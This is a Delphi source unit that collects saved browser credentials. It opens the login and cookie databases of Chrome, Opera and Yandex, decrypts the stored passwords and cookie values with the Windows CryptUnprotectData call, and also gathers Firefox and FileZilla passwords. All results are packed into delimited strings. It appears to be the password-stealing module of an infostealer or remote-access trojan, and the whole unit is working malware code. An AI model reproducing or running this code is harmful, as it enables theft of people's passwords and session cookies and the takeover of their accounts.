unit UnitB_Passwords;

interface
         
uses
  Windows, Classes, SQLite3, SQLiteTable3, UnitFirefox, UnitFunctions, UnitFileZilla;

function ListAllPasswords(Sqlite3Path: string): string;
function ListAllCookies(Sqlite3Path: string): string;

implementation

function CryptUnprotectData(pDataIn: PDATA_BLOB; ppszDataDescr: PLPWSTR;
  pOptionalEntropy: PDATA_BLOB; pvReserved: Pointer; pPromptStruct: PCRYPTPROTECT_PROMPTSTRUCT;
  dwFlags: DWORD; pDataOut: PDATA_BLOB): BOOL; stdcall; external 'crypt32.dll' Name 'CryptUnprotectData';

function _ListPasswords(Browser: string; LoginsFile: string; Sqlite3Path: string): string;
const
  SQLQuery = 'SELECT * FROM logins';
var
  SQLiteDatabase: TSQLiteDatabase;
  SQLIteTable: TSQLIteTable;
  DATA_IN: DATA_BLOB;
  DATA_OUT: DATA_BLOB;
  Stream: TMemorystream;
  Password: string;
  i: Integer;
begin
  Result := '';
  merdadll := Sqlite3Path;
  LoginsFile := AppDataDir + LoginsFile;
  if not FileExists(LoginsFile) then Exit;

  SQLiteDatabase := TSQLiteDatabase.Create(LoginsFile);
  SQLIteTable := SQLiteDatabase.GetTable(SQLQuery);

  for i := 0 to SQLIteTable.Count - 1 do
  begin
    Result := Result + Browser + '|';
    Result := Result + SQLIteTable.FieldAsString(SQLIteTable.FieldIndex['origin_url']) + '|';
    Result := Result + SQLIteTable.FieldAsString(SQLIteTable.FieldIndex['username_value']) + '|';
    
    Stream := TMemoryStream.Create;
    Stream := SQLIteTable.FieldAsBlob(SQLIteTable.FieldIndex['password_value']);
    DATA_IN.pbData := Stream.Memory;
    DATA_OUT.cbData := Stream.Size;
    CryptUnProtectData(@DATA_IN, nil, nil, nil, nil, 0, @DATA_OUT);
    SetString(Password, PAnsiChar(DATA_OUT.pbData), DATA_OUT.cbData);
    Result := Result + Password + '|' + #13#10;
               
    Stream.Free;
    SQLIteTable.Next;
  end;
  
  SQLIteTable.Free;
  SQLiteDatabase.Free;
end;

function _ListCookies(Browser: string; CookiesFile: string; Sqlite3Path: string): string;
const
  SQLQuery = 'SELECT * FROM cookies';
var
  SQLIteDatabase: TSQLiteDatabase;
  SQLIteTable: TSQLIteTable;
  DATA_IN: DATA_BLOB;
  DATA_OUT: DATA_BLOB;
  Stream: TMemorystream;
  Domain, Name, Value, Path: string;
  Expired, HttpOnly, Secure: Boolean;
  i: Integer;
begin
  Result := '';
  merdadll := Sqlite3Path;
  CookiesFile := AppDataDir + CookiesFile;
  if not FileExists(CookiesFile) then Exit;

  SQLIteDatabase := TSQLiteDatabase.Create(CookiesFile);
  SQLIteTable := SQLIteDatabase.GetTable(SQLQuery);

  for i := 0 to SQLIteTable.Count - 1 do
  begin
    Domain := SQLIteTable.FieldAsString(SQLIteTable.FieldIndex['host_key']);
    Name := SQLIteTable.FieldAsString(SQLIteTable.FieldIndex['name']);
    Path := SQLIteTable.FieldAsString(SQLIteTable.FieldIndex['path']);
    Expired := SQLIteTable.FieldAsString(SQLIteTable.FieldIndex['has_expired']) = '1';
    HttpOnly := SQLIteTable.FieldAsString(SQLIteTable.FieldIndex['httponly']) = '1';
    Secure := SQLIteTable.FieldAsString(SQLIteTable.FieldIndex['secure']) = '1';

    Stream := TMemoryStream.Create;
    Stream := SQLIteTable.FieldAsBlob(SQLIteTable.FieldIndex['encrypted_value']);
    DATA_IN.pbData := Stream.Memory;
    DATA_OUT.cbData := Stream.Size;
    CryptUnProtectData(@DATA_IN, nil, nil, nil, nil, 0, @DATA_OUT);
    SetString(Value, PAnsiChar(DATA_OUT.pbData), DATA_OUT.cbData);

    Result := Result + Browser + '|';
    Result := Result + Domain + '|';
    Result := Result + Name + '|';
    Result := Result + Path + '|';
    Result := Result + MyBoolToStr(HttpOnly) + '|';
    Result := Result + MyBoolToStr(Secure) + '|';
    Result := Result + MyBoolToStr(Expired) + '|';
    Result := Result + Value + '|' + #13#10;

    Stream.Free;
    SQLIteTable.Next;
  end;

  SQLIteTable.Free;
  SQLiteDatabase.Free;
end;
                        
function ListAllPasswords(Sqlite3Path: string): string;
var
  FFVersion, FFPath: string;
begin
  Result := '';
  if CheckChromeInstallation then
  Result := Result + _ListPasswords('Google Chrome', 'Google\Chrome\User Data\Default\Login Data', Sqlite3Path) + '_';
  if CheckOperaInstallation then
  Result := Result + _ListPasswords('Opera', 'Opera Software\Opera Stable\Login Data', Sqlite3Path) + '_';
  if CheckYandexInstallation then
  Result := Result + _ListPasswords('Yandex', 'Yandex\YandexBrowser\User Data\Default\Login Data', Sqlite3Path) + '_';
  if CheckFirefoxInstallation(FFVersion, FFPath) then
  Result := Result + GetFirefoxPasswords(FFVersion, FFPath) + '_';
  if CheckFileZillaInstallation then
  Result := Result + GetFileZillaPasswords + '_';
end;

function ListAllCookies(Sqlite3Path: string): string;
var
  FFVersion, FFPath: string;
begin
  Result := '';
  if CheckChromeInstallation then
  Result := Result + _ListCookies('Google Chrome', 'Google\Chrome\User Data\Default\Cookies', Sqlite3Path) + '_';
  if CheckOperaInstallation then
  Result := Result + _ListCookies('Opera', 'Opera Software\Opera Stable\Cookies', Sqlite3Path) + '_';
  if CheckYandexInstallation then
  Result := Result + _ListCookies('Yandex', 'Yandex\YandexBrowser\User Data\Default\Cookies', Sqlite3Path) + '_';
  if CheckFirefoxInstallation(FFVersion, FFPath) then
  Result := Result + GetFirefoxCookies(FFPath) + '_';
end;

end.
